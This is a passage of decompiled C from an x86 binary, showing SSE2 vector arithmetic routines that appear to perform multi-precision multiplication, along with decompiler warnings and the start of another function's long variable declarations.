  v161 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v149, v149), _mm_loadl_epi64(&v308)), (__m128i)v160);
  v162 = (__m128i)_mm_movehl_ps(v160, v161);
  *(_DWORD *)(v163 + 56) = _mm_cvtsi128_si32((__m128i)v161);
  v164 = (__m128)_mm_add_epi32(v157, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v156, v159), v159), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v164);
  v165 = _mm_add_epi64(_mm_srli_epi64((__m128i)v161, 0x10u), (__m128i)v164);
  *(_QWORD *)(v163 + 58) = v165.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v165, 0x30u), v162).m128i_u64[0];
  v166 = _mm_load_si128(&v314);
  v167 = _mm_mul_epu32(_mm_load_si128(&v312), v166);
  v168 = _mm_load_si128(&stru_46C990);
  v169 = _mm_and_si128(v168, v167);
  v170 = _mm_srli_epi32(v167, 0x10u);
  v172 = _mm_mul_epu32(v166, *(__m128i *)(v171 - 16));
  sub_419125();
  v173 = _mm_load_si128(&v313);
  v174 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v313.m128i_i8[8]), v173);
  v175 = _mm_mul_epu32(v173, v173);
  v176 = _mm_load_si128(&stru_46C990);
  v177 = _mm_add_epi32(_mm_and_si128(v168, v172), _mm_and_si128(v176, v174));
  v178 = _mm_add_epi32(_mm_srli_epi32(v172, 0x10u), _mm_srli_epi32(v174, 0x10u));
  v179 = _mm_add_epi32(v177, v177);
  v180 = _mm_add_epi32(v178, v178);
  v181 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v170, v170), _mm_srli_epi32(v175, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v182 = _mm_move_epi64(v179);
  v183 = _mm_move_epi64(v180);
  v184 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v179, v182), v182), 4);
  v185 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v169, v169), _mm_and_si128(v176, v175)),
                     _mm_loadl_epi64(&v308)),
                   (__m128i)v184);
  v186 = (__m128i)_mm_movehl_ps(v184, v185);
  *(_DWORD *)(v187 + 64) = _mm_cvtsi128_si32((__m128i)v185);
  v188 = (__m128)_mm_add_epi32(v181, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v180, v183), v183), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v188);
  v189 = _mm_add_epi64(_mm_srli_epi64((__m128i)v185, 0x10u), (__m128i)v188);
  *(_QWORD *)(v187 + 66) = v189.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v189, 0x30u), v186).m128i_u64[0];
  v190 = _mm_load_si128(&v314);
  v191 = _mm_mul_epu32(_mm_load_si128(&v313), v190);
  v192 = _mm_load_si128(&stru_46C990);
  v193 = _mm_and_si128(v192, v191);
  v194 = _mm_srli_epi32(v191, 0x10u);
  v196 = _mm_mul_epu32(v190, *v195);
  v197 = _mm_and_si128(v192, v196);
  v198 = _mm_srli_epi32(v196, 0x10u);
  sub_419125();
  v199 = _mm_add_epi32(v197, v197);
  v200 = _mm_add_epi32(v198, v198);
  v201 = _mm_add_epi32(_mm_add_epi32(v194, v194), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v202 = _mm_move_epi64(v199);
  v203 = _mm_move_epi64(v200);
  v204 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v199, v202), v202), 4);
  v205 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v193, v193), _mm_loadl_epi64(&v308)), (__m128i)v204);
  v206 = (__m128i)_mm_movehl_ps(v204, v205);
  *(_DWORD *)(v207 + 72) = _mm_cvtsi128_si32((__m128i)v205);
  v208 = (__m128)_mm_add_epi32(v201, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v200, v203), v203), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v208);
  v209 = _mm_add_epi64(_mm_srli_epi64((__m128i)v205, 0x10u), (__m128i)v208);
  *(_QWORD *)(v207 + 74) = v209.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v209, 0x30u), v206).m128i_u64[0];
  v210 = _mm_load_si128(&v315);
  v211 = _mm_mul_epu32(_mm_load_si128(&v313), v210);
  v212 = _mm_load_si128(&stru_46C990);
  v213 = _mm_and_si128(v212, v211);
  v214 = _mm_srli_epi32(v211, 0x10u);
  v216 = _mm_mul_epu32(v210, *(__m128i *)(v215 - 16));
  sub_419162((int)&v314, &v314);
  v217 = _mm_load_si128(&v314);
  v218 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v314.m128i_i8[8]), v217);
  v219 = _mm_mul_epu32(v217, v217);
  v220 = _mm_load_si128(&stru_46C990);
  v221 = _mm_add_epi32(_mm_and_si128(v212, v216), _mm_and_si128(v220, v218));
  v222 = _mm_add_epi32(_mm_srli_epi32(v216, 0x10u), _mm_srli_epi32(v218, 0x10u));
  v223 = _mm_add_epi32(v221, v221);
  v224 = _mm_add_epi32(v222, v222);
  v225 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v214, v214), _mm_srli_epi32(v219, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v226 = _mm_move_epi64(v223);
  v227 = _mm_move_epi64(v224);
  v228 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v223, v226), v226), 4);
  v229 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v213, v213), _mm_and_si128(v220, v219)),
                     _mm_loadl_epi64(&v308)),
                   (__m128i)v228);
  v230 = (__m128i)_mm_movehl_ps(v228, v229);
  *(_DWORD *)(v231 + 80) = _mm_cvtsi128_si32((__m128i)v229);
  v232 = (__m128)_mm_add_epi32(v225, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v224, v227), v227), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v232);
  v233 = _mm_add_epi64(_mm_srli_epi64((__m128i)v229, 0x10u), (__m128i)v232);
  *(_QWORD *)(v231 + 82) = v233.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v233, 0x30u), v230).m128i_u64[0];
  v234 = _mm_load_si128(&v315);
  v235 = _mm_mul_epu32(_mm_load_si128(&v314), v234);
  v236 = _mm_load_si128(&stru_46C990);
  v237 = _mm_and_si128(v236, v235);
  v238 = _mm_srli_epi32(v235, 0x10u);
  v240 = _mm_mul_epu32(v234, *v239);
  v241 = _mm_and_si128(v236, v240);
  v242 = _mm_srli_epi32(v240, 0x10u);
  sub_419162((int)&v315, &v314);
  v244 = _mm_add_epi32(v241, v241);
  v245 = _mm_add_epi32(v242, v242);
  v246 = _mm_add_epi32(_mm_add_epi32(v238, v238), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v247 = _mm_move_epi64(v244);
  v248 = _mm_move_epi64(v245);
  v249 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v244, v247), v247), 4);
  v250 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v237, v237), _mm_loadl_epi64(&v308)), (__m128i)v249);
  v251 = (__m128i)_mm_movehl_ps(v249, v250);
  *(_DWORD *)(v252 + 88) = _mm_cvtsi128_si32((__m128i)v250);
  v253 = (__m128)_mm_add_epi32(v246, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v245, v248), v248), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v253);
  v254 = _mm_add_epi64(_mm_srli_epi64((__m128i)v250, 0x10u), (__m128i)v253);
  *(_QWORD *)(v252 + 90) = v254.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v254, 0x30u), v251).m128i_u64[0];
  v255 = _mm_load_si128(&v316);
  v256 = _mm_mul_epu32(_mm_load_si128(&v314), v255);
  v257 = _mm_load_si128(&stru_46C990);
  v258 = _mm_and_si128(v257, v256);
  v259 = _mm_srli_epi32(v256, 0x10u);
  v261 = _mm_mul_epu32(v255, v260[-1]);
  v262 = _mm_load_si128(&v315);
  v263 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v315.m128i_i8[8]), v262);
  v264 = _mm_mul_epu32(v262, v262);
  v265 = v257;
  v266 = _mm_add_epi32(_mm_and_si128(v257, v261), _mm_and_si128(v257, v263));
  v267 = _mm_add_epi32(_mm_srli_epi32(v261, 0x10u), _mm_srli_epi32(v263, 0x10u));
  v268 = _mm_add_epi32(v266, v266);
  v269 = _mm_add_epi32(v267, v267);
  v270 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v259, v259), _mm_srli_epi32(v264, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v271 = _mm_move_epi64(v268);
  v272 = _mm_move_epi64(v269);
  v273 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v268, v271), v271), 4);
  v274 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v258, v258), _mm_and_si128(v265, v264)),
                     _mm_loadl_epi64(&v308)),
                   (__m128i)v273);
  v275 = (__m128i)_mm_movehl_ps(v273, v274);
  *(_DWORD *)(v252 + 96) = _mm_cvtsi128_si32((__m128i)v274);
  v276 = (__m128)_mm_add_epi32(v270, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v269, v272), v272), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v276);
  v277 = _mm_add_epi64(_mm_srli_epi64((__m128i)v274, 0x10u), (__m128i)v276);
  *(_QWORD *)(v252 + 98) = v277.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v277, 0x30u), v275).m128i_u64[0];
  ++v260;
  v278 = _mm_load_si128(&v316);
  v279 = _mm_mul_epu32(_mm_load_si128(&v315), v278);
  v280 = _mm_load_si128(&stru_46C990);
  v281 = _mm_and_si128(v280, v279);
  v282 = _mm_srli_epi32(v279, 0x10u);
  v283 = _mm_mul_epu32(v278, v260[-1]);
  v284 = _mm_and_si128(v280, v283);
  v285 = _mm_srli_epi32(v283, 0x10u);
  v286 = _mm_add_epi32(v284, v284);
  v287 = _mm_add_epi32(v285, v285);
  v288 = _mm_move_epi64(v286);
  v289 = _mm_move_epi64(v287);
  v290 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v281, v281), _mm_loadl_epi64(&v308)),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v286, v288), v288), 4));
  v291 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v282, v282), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8])),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v287, v289), v289), 4));
  *(_DWORD *)(v252 + 104) = _mm_cvtsi128_si32(v290);
  v292 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v290), 0x10u), _mm_move_epi64(v291));
  v293 = _mm_unpackhi_epi64(v291, v288);
  *(_QWORD *)(v252 + 106) = v292.m128i_i64[0];
  v294 = _mm_add_epi32(_mm_unpackhi_epi64(v290, v288), _mm_srli_epi64(v292, 0x30u));
  v295 = _mm_load_si128(&v316);
  v296 = _mm_mul_epu32(v295, v295);
  v297 = _mm_mul_epu32(v295, *v260);
  v298 = _mm_load_si128(&stru_46C990);
  v299 = _mm_and_si128(v298, v296);
  v300 = _mm_add_epi32(v293, _mm_srli_epi32(v296, 0x10u));
  v301 = _mm_and_si128(v298, v297);
  v302 = _mm_srli_epi32(v297, 0x10u);
  v303 = _mm_move_epi64(v301);
  v304 = _mm_move_epi64(v302);
  v305 = _mm_add_epi32(
           _mm_add_epi32(v294, v299),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v301, v303), v303), 4));
  v306 = _mm_add_epi32(v300, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v302, v304), v304), 4));
  *(_DWORD *)(v252 + 112) = _mm_cvtsi128_si32(v305);
  v307 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v305), 0x10u), _mm_move_epi64(v306));
  *(_QWORD *)(v252 + 114) = v307.m128i_i64[0];
  *(_QWORD *)(v252 + 120) = _mm_add_epi64(
                              _mm_add_epi32(_mm_unpackhi_epi64(v305, v303), _mm_srli_epi64(v307, 0x30u)),
                              _mm_slli_epi64(_mm_unpackhi_epi64(v306, v303), 0x10u)).m128i_u64[0];
  return result;
}
// 419406: variable 'v75' is possibly undefined
// 419453: variable 'v83' is possibly undefined
// 4194EE: variable 'v99' is possibly undefined
// 41953E: variable 'v107' is possibly undefined
// 41959E: variable 'v119' is possibly undefined
// 4195EB: variable 'v127' is possibly undefined
// 419686: variable 'v143' is possibly undefined
// 4196D6: variable 'v151' is possibly undefined
// 419736: variable 'v163' is possibly undefined
// 419783: variable 'v171' is possibly undefined
// 41981E: variable 'v187' is possibly undefined
// 41986E: variable 'v195' is possibly undefined
// 4198CE: variable 'v207' is possibly undefined
// 41991B: variable 'v215' is possibly undefined
// 4199B6: variable 'v231' is possibly undefined
// 419A06: variable 'v239' is possibly undefined
// 419A66: variable 'v252' is possibly undefined
// 419AB3: variable 'v260' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;

//----- (004190E8) --------------------------------------------------------
int sub_4190E8()
{
  return sub_419125();
}
// 419125: using guessed type int sub_419125(void);

//----- (00419125) --------------------------------------------------------
int sub_419125()
{
  return sub_419162();
}
// 419162: using guessed type int sub_419162(void);

//----- (00419162) --------------------------------------------------------
__m128i __usercall sub_419162@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 32)), _mm_load_si128(a2 + 2)), 0x10u);
}

//----- (00419CBE) --------------------------------------------------------
int __cdecl sub_419CBE(int a1, int a2)
{
  unsigned int i; // edx
  __m128i v3; // xmm0
  __m128i v4; // xmm1
  __m128i v5; // xmm7
  __m128i v6; // xmm5
  __m128i si128; // xmm6
  __m128i v8; // xmm4
  __m128i v9; // xmm7
  __m128i v10; // xmm6
  __m128i v11; // xmm7
  __m128i v12; // xmm0
  __m128i v13; // xmm1
  __m128 v14; // xmm6
  __m128 v15; // xmm4
  __m128i v16; // xmm6
  __m128 v17; // xmm5
  __m128i v18; // xmm4
  __m128i v19; // xmm7
  __m128i v20; // xmm5
  __m128i v21; // xmm6
  __m128i v22; // xmm4
  __m128i v23; // xmm5
  __m128i v24; // xmm7
  __m128i v25; // xmm6
  __m128i v26; // xmm7
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm5
  __m128i v30; // xmm0
  __m128i v31; // xmm1
  __m128 v32; // xmm6
  __m128 v33; // xmm4
  __m128i v34; // xmm6
  __m128 v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm5
  __m128i v39; // xmm6
  __m128i v40; // xmm4
  __m128i v41; // xmm5
  __m128i v42; // xmm7
  __m128i v43; // xmm3
  __m128i v44; // xmm1
  __m128i v45; // xmm3
  __m128i v46; // xmm2
  __m128i v47; // xmm6
  __m128i v48; // xmm7
  __m128i v49; // xmm6
  __m128i v50; // xmm7
  __m128i v51; // xmm5
  __m128i v52; // xmm0
  __m128i v53; // xmm1
  __m128 v54; // xmm6
  __m128 v55; // xmm4
  __m128i v56; // xmm6
  __m128 v57; // xmm5
  __m128i v58; // xmm4
  __m128i v59; // xmm7
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm4
  __m128i v63; // xmm5
  __m128i v64; // xmm7
  __m128i v65; // xmm6
  __m128i v66; // xmm7
  __m128i v67; // xmm6
  __m128i v68; // xmm7
  __m128i v69; // xmm5
  __m128i v70; // xmm0
  __m128i v71; // xmm1
  __m128 v72; // xmm6
  __m128 v73; // xmm4
  __m128i v74; // xmm6
  int v75; // ecx
  __m128 v76; // xmm5
  __m128i v77; // xmm4
  __m128i v78; // xmm7
  __m128i v79; // xmm5
  __m128i v80; // xmm6
  __m128i v81; // xmm4
  __m128i v82; // xmm5
  int v83; // edx
  __m128i v84; // xmm7
  __m128i v85; // xmm3
  __m128i v86; // xmm1
  __m128i v87; // xmm3
  __m128i v88; // xmm2
  __m128i v89; // xmm6
  __m128i v90; // xmm7
  __m128i v91; // xmm6
  __m128i v92; // xmm7
  __m128i v93; // xmm5
  __m128i v94; // xmm0
  __m128i v95; // xmm1
  __m128 v96; // xmm6
  __m128 v97; // xmm4
  __m128i v98; // xmm6
  int v99; // ecx
  __m128 v100; // xmm5
  __m128i v101; // xmm4
  __m128i v102; // xmm7
  __m128i v103; // xmm5
  __m128i v104; // xmm6
  __m128i v105; // xmm4
  __m128i v106; // xmm5
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm7
  __m128i v111; // xmm6
  __m128i v112; // xmm7
  __m128i v113; // xmm5
  __m128i v114; // xmm0
  __m128i v115; // xmm1
  __m128 v116; // xmm6
  __m128 v117; // xmm4
  __m128i v118; // xmm6
  int v119; // ecx
  __m128 v120; // xmm5
  __m128i v121; // xmm4
  __m128i v122; // xmm7
  __m128i v123; // xmm5
  __m128i v124; // xmm6
  __m128i v125; // xmm4
  __m128i v126; // xmm5
  int v127; // edx
  __m128i v128; // xmm7
  __m128i v129; // xmm3
  __m128i v130; // xmm1
  __m128i v131; // xmm3
  __m128i v132; // xmm2
  __m128i v133; // xmm6
  __m128i v134; // xmm7
  __m128i v135; // xmm6
  __m128i v136; // xmm7
  __m128i v137; // xmm5
  __m128i v138; // xmm0
  __m128i v139; // xmm1
  __m128 v140; // xmm6
  __m128 v141; // xmm4
  __m128i v142; // xmm6
  int v143; // ecx
  __m128 v144; // xmm5
  __m128i v145; // xmm4
  __m128i v146; // xmm7
  __m128i v147; // xmm5
  __m128i v148; // xmm6
  __m128i v149; // xmm4
  __m128i v150; // xmm5
  __m128i *v151; // edx
  __m128i v152; // xmm7
  __m128i v153; // xmm6
  __m128i v154; // xmm7
  __m128i v155; // xmm6
  __m128i v156; // xmm7
  __m128i v157; // xmm5
  __m128i v158; // xmm0
  __m128i v159; // xmm1
  __m128 v160; // xmm6
  __m128 v161; // xmm4
  __m128i v162; // xmm6
  int v163; // ecx
  __m128 v164; // xmm5
  __m128i v165; // xmm4
  __m128i v166; // xmm7
  __m128i v167; // xmm5
  __m128i v168; // xmm6
  __m128i v169; // xmm4
  __m128i v170; // xmm5
  int v171; // edx
  __m128i v172; // xmm7
  __m128i v173; // xmm3
  __m128i v174; // xmm1
  __m128i v175; // xmm3
  __m128i v176; // xmm2
  __m128i v177; // xmm6
  __m128i v178; // xmm7
  __m128i v179; // xmm6
  __m128i v180; // xmm7
  __m128i v181; // xmm5
  __m128i v182; // xmm0
  __m128i v183; // xmm1
  __m128 v184; // xmm6
  __m128 v185; // xmm4
  __m128i v186; // xmm6
  int v187; // ecx
  __m128 v188; // xmm5
  __m128i v189; // xmm4
  __m128i v190; // xmm7
  __m128i v191; // xmm5
  __m128i v192; // xmm6
  __m128i v193; // xmm4
  __m128i v194; // xmm5
  __m128i *v195; // edx
  __m128i v196; // xmm7
  __m128i v197; // xmm6
  __m128i v198; // xmm7
  __m128i v199; // xmm6
  __m128i v200; // xmm7
  __m128i v201; // xmm5
  __m128i v202; // xmm0
  __m128i v203; // xmm1
  __m128 v204; // xmm6
  __m128 v205; // xmm4
  __m128i v206; // xmm6
  int v207; // ecx
  __m128 v208; // xmm5
  __m128i v209; // xmm4
  __m128i v210; // xmm7
  __m128i v211; // xmm5
  __m128i v212; // xmm6
  __m128i v213; // xmm4
  __m128i v214; // xmm5
  int v215; // edx
  __m128i v216; // xmm7
  __m128i v217; // xmm3
  __m128i v218; // xmm1
  __m128i v219; // xmm3
  __m128i v220; // xmm2
  __m128i v221; // xmm6
  __m128i v222; // xmm7
  __m128i v223; // xmm6
  __m128i v224; // xmm7
  __m128i v225; // xmm5
  __m128i v226; // xmm0
  __m128i v227; // xmm1
  __m128 v228; // xmm6
  __m128 v229; // xmm4
  __m128i v230; // xmm6
  int v231; // ecx
  __m128 v232; // xmm5
  __m128i v233; // xmm4
  __m128i v234; // xmm7
  __m128i v235; // xmm5
  __m128i v236; // xmm6
  __m128i v237; // xmm4
  __m128i v238; // xmm5
  __m128i *v239; // edx
  __m128i v240; // xmm7
  __m128i v241; // xmm6
  __m128i v242; // xmm7
  __m128i v243; // xmm6
  __m128i v244; // xmm7
  __m128i v245; // xmm5
  __m128i v246; // xmm0
  __m128i v247; // xmm1
  __m128 v248; // xmm6
  __m128 v249; // xmm4
  __m128i v250; // xmm6
  int v251; // ecx
  __m128 v252; // xmm5
  __m128i v253; // xmm4
  __m128i v254; // xmm7
  __m128i v255; // xmm5
  __m128i v256; // xmm6
  __m128i v257; // xmm4
  __m128i v258; // xmm5
  int v259; // edx
  __m128i v260; // xmm7
  __m128i v261; // xmm3
  __m128i v262; // xmm1
  __m128i v263; // xmm3
  __m128i v264; // xmm2
  __m128i v265; // xmm6
  __m128i v266; // xmm7
  __m128i v267; // xmm6
  __m128i v268; // xmm7
  __m128i v269; // xmm5
  __m128i v270; // xmm0
  __m128i v271; // xmm1
  __m128 v272; // xmm6
  __m128 v273; // xmm4
  __m128i v274; // xmm6
  int v275; // ecx
  __m128 v276; // xmm5
  __m128i v277; // xmm4
  __m128i v278; // xmm7
  __m128i v279; // xmm5
  __m128i v280; // xmm6
  __m128i v281; // xmm4
  __m128i v282; // xmm5
  __m128i *v283; // edx
  __m128i v284; // xmm7
  __m128i v285; // xmm6
  __m128i v286; // xmm7
  __m128i v287; // xmm6
  __m128i v288; // xmm7
  __m128i v289; // xmm5
  __m128i v290; // xmm0
  __m128i v291; // xmm1
  __m128 v292; // xmm6
  __m128 v293; // xmm4
  __m128i v294; // xmm6
  int v295; // ecx
  __m128 v296; // xmm5
  __m128i v297; // xmm4
  __m128i v298; // xmm7
  __m128i v299; // xmm5
  __m128i v300; // xmm6
  __m128i v301; // xmm4
  __m128i v302; // xmm5
  int v303; // edx
  __m128i v304; // xmm7
  __m128i v305; // xmm3
  __m128i v306; // xmm1
  __m128i v307; // xmm3
  __m128i v308; // xmm2
  __m128i v309; // xmm6
  __m128i v310; // xmm7
  __m128i v311; // xmm6
  __m128i v312; // xmm7
  __m128i v313; // xmm5
  __m128i v314; // xmm0
  __m128i v315; // xmm1
  __m128 v316; // xmm6
  __m128 v317; // xmm4
  __m128i v318; // xmm6
  int v319; // ecx
  __m128 v320; // xmm5
  __m128i v321; // xmm4
  __m128i v322; // xmm7
  __m128i v323; // xmm5
  __m128i v324; // xmm6
  __m128i v325; // xmm4
  __m128i v326; // xmm5
  __m128i *v327; // edx
  __m128i v328; // xmm7
  __m128i v329; // xmm6
  __m128i v330; // xmm7
  __m128i v331; // xmm6
  __m128i v332; // xmm7
  __m128i v333; // xmm5
  __m128i v334; // xmm0
  __m128i v335; // xmm1
  __m128 v336; // xmm6
  __m128 v337; // xmm4
  __m128i v338; // xmm6
  int v339; // ecx
  __m128 v340; // xmm5
  __m128i v341; // xmm4
  __m128i v342; // xmm7
  __m128i v343; // xmm5
  __m128i v344; // xmm6
  __m128i v345; // xmm4
  __m128i v346; // xmm5
  int v347; // edx
  __m128i v348; // xmm7
  __m128i v349; // xmm3
  __m128i v350; // xmm1
  __m128i v351; // xmm3
  __m128i v352; // xmm2
  __m128i v353; // xmm6
  __m128i v354; // xmm7
  __m128i v355; // xmm6
  __m128i v356; // xmm7
  __m128i v357; // xmm5
  __m128i v358; // xmm0
  __m128i v359; // xmm1
  __m128 v360; // xmm6
  __m128 v361; // xmm4
  __m128i v362; // xmm6
  int v363; // ecx
  __m128 v364; // xmm5
  __m128i v365; // xmm4
  __m128i v366; // xmm7
  __m128i v367; // xmm5
  __m128i v368; // xmm6
  __m128i v369; // xmm4
  __m128i v370; // xmm5
  __m128i *v371; // edx
  __m128i v372; // xmm7
  __m128i v373; // xmm6
  __m128i v374; // xmm7
  __m128i v375; // xmm6
  __m128i v376; // xmm7
  __m128i v377; // xmm5
  __m128i v378; // xmm0
  __m128i v379; // xmm1
  __m128 v380; // xmm6
  __m128 v381; // xmm4
  __m128i v382; // xmm6
  int v383; // ecx
  __m128 v384; // xmm5
  __m128i v385; // xmm4
  __m128i v386; // xmm7
  __m128i v387; // xmm5
  __m128i v388; // xmm6
  __m128i v389; // xmm4
  __m128i v390; // xmm5
  int v391; // edx
  __m128i v392; // xmm7
  __m128i v393; // xmm3
  __m128i v394; // xmm1
  __m128i v395; // xmm3
  __m128i v396; // xmm2
  __m128i v397; // xmm6
  __m128i v398; // xmm7
  __m128i v399; // xmm6
  __m128i v400; // xmm7
  __m128i v401; // xmm5
  __m128i v402; // xmm0
  __m128i v403; // xmm1
  __m128 v404; // xmm6
  __m128 v405; // xmm4
  __m128i v406; // xmm6
  int v407; // ecx
  __m128 v408; // xmm5
  __m128i v409; // xmm4
  __m128i v410; // xmm7
  __m128i v411; // xmm5
  __m128i v412; // xmm6
  __m128i v413; // xmm4
  __m128i v414; // xmm5
  __m128i *v415; // edx
  __m128i v416; // xmm7
  __m128i v417; // xmm6
  __m128i v418; // xmm7
  __m128i v419; // xmm6
  __m128i v420; // xmm7
  __m128i v421; // xmm5
  __m128i v422; // xmm0
  __m128i v423; // xmm1
  __m128 v424; // xmm6
  __m128 v425; // xmm4
  __m128i v426; // xmm6
  int v427; // ecx
  __m128 v428; // xmm5
  __m128i v429; // xmm4
  __m128i v430; // xmm7
  __m128i v431; // xmm5
  __m128i v432; // xmm6
  __m128i v433; // xmm4
  __m128i v434; // xmm5
  int v435; // edx
  __m128i v436; // xmm7
  __m128i v437; // xmm3
  __m128i v438; // xmm1
  __m128i v439; // xmm3
  __m128i v440; // xmm2
  __m128i v441; // xmm6
  __m128i v442; // xmm7
  __m128i v443; // xmm6
  __m128i v444; // xmm7
  __m128i v445; // xmm5
  __m128i v446; // xmm0
  __m128i v447; // xmm1
  __m128 v448; // xmm6
  __m128 v449; // xmm4
  __m128i v450; // xmm6
  int v451; // ecx
  __m128 v452; // xmm5
  __m128i v453; // xmm4
  __m128i v454; // xmm7
  __m128i v455; // xmm5
  __m128i v456; // xmm6
  __m128i v457; // xmm4
  __m128i v458; // xmm5
  __m128i *v459; // edx
  __m128i v460; // xmm7
  __m128i v461; // xmm6
  __m128i v462; // xmm7
  __m128i v463; // xmm6
  __m128i v464; // xmm7
  __m128i v465; // xmm5
  __m128i v466; // xmm0
  __m128i v467; // xmm1
  __m128 v468; // xmm6
  __m128 v469; // xmm4
  __m128i v470; // xmm6
  int v471; // ecx
  __m128 v472; // xmm5
  __m128i v473; // xmm4
  __m128i v474; // xmm7
  __m128i v475; // xmm5
  __m128i v476; // xmm6
  __m128i v477; // xmm4
  __m128i v478; // xmm5
  int v479; // edx
  __m128i v480; // xmm7
  __m128i v481; // xmm3
  __m128i v482; // xmm1
  __m128i v483; // xmm3
  __m128i v484; // xmm2
  __m128i v485; // xmm6
  __m128i v486; // xmm7
  __m128i v487; // xmm6
  __m128i v488; // xmm7
  __m128i v489; // xmm5
  __m128i v490; // xmm0
  __m128i v491; // xmm1
  __m128 v492; // xmm6
  __m128 v493; // xmm4
  __m128i v494; // xmm6
  int v495; // ecx
  __m128 v496; // xmm5
  __m128i v497; // xmm4
  __m128i v498; // xmm7
  __m128i v499; // xmm5
  __m128i v500; // xmm6
  __m128i v501; // xmm4
  __m128i v502; // xmm5
  __m128i *v503; // edx
  __m128i v504; // xmm7
  __m128i v505; // xmm6
  __m128i v506; // xmm7
  __m128i v507; // xmm6
  __m128i v508; // xmm7
  __m128i v509; // xmm5
  __m128i v510; // xmm0
  __m128i v511; // xmm1
  __m128 v512; // xmm6
  __m128 v513; // xmm4
  __m128i v514; // xmm6
  int v515; // ecx
  __m128 v516; // xmm5
  __m128i v517; // xmm4
  __m128i v518; // xmm7
  __m128i v519; // xmm5
  __m128i v520; // xmm6
  __m128i v521; // xmm4
  __m128i v522; // xmm5
  int v523; // edx
  __m128i v524; // xmm7
  __m128i v525; // xmm3
  __m128i v526; // xmm1
  __m128i v527; // xmm3
  __m128i v528; // xmm2
  __m128i v529; // xmm6
  __m128i v530; // xmm7
  __m128i v531; // xmm6
  __m128i v532; // xmm7
  __m128i v533; // xmm5
  __m128i v534; // xmm0
  __m128i v535; // xmm1
  __m128 v536; // xmm6
  __m128 v537; // xmm4
  __m128i v538; // xmm6
  int v539; // ecx
  __m128 v540; // xmm5
  __m128i v541; // xmm4
  __m128i v542; // xmm7
  __m128i v543; // xmm5
  __m128i v544; // xmm6
  __m128i v545; // xmm4
  __m128i v546; // xmm5
  __m128i *v547; // edx
  __m128i v548; // xmm7
  __m128i v549; // xmm6
  __m128i v550; // xmm7
  __m128i v551; // xmm6
  __m128i v552; // xmm7
  __m128i v553; // xmm5
  __m128i v554; // xmm0
  __m128i v555; // xmm1
  __m128 v556; // xmm6
  __m128 v557; // xmm4
  __m128i v558; // xmm6
  int v559; // ecx
  __m128 v560; // xmm5
  __m128i v561; // xmm4
  __m128i v562; // xmm7
  __m128i v563; // xmm5
  __m128i v564; // xmm6
  __m128i v565; // xmm4
  __m128i v566; // xmm5
  int v567; // edx
  __m128i v568; // xmm7
  __m128i v569; // xmm3
  __m128i v570; // xmm1
